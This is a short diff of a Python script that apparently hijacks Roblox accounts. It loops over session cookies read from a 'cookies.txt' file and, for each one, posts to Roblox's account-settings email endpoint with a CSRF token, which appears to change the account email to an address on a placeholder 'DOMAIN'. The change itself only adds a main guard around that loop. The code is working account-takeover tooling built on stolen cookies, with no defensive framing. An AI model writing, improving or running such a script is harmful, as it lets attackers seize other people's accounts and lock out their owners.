@@ -29,7 +29,8 @@ class Shit:
         req = self.request.post('https://accountsettings.roblox.com/v1/email',json=data,headers={'x-csrf-token':self.getXsrf()})
         return req
 
-for i in open('cookies.txt','r').readlines():
-    a = Shit(i.strip()
-        ,"DOMAIN").emailTH()
-    print(a,a.text)
+if __name__ == "__main__":
+    for i in open('cookies.txt','r').readlines():
+        a = Shit(i.strip()
+            ,"DOMAIN").emailTH()
+        print(a,a.text)
